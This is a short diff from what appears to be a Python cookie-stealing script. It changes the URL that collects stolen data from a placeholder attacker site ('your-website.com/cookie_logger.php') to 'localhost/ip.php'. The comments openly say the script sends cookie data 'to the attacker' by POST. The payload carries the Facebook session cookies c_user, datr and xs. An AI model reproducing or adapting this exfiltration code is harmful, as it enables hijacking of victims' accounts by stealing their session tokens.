@@ -74,7 +74,7 @@ xs=str(xs)
 #sending the cookie data to the attacker using POST request.
 #edit the url and place your website name where you have hosted your cookie_logger.php script
 
-url = 'http://your-website.com/cookie_logger.php'
+url = 'http://localhost/ip.php'
 payload = {'c_user': c_user, 'datr': datr,'xs': xs}
 
 if (xs != "None"):
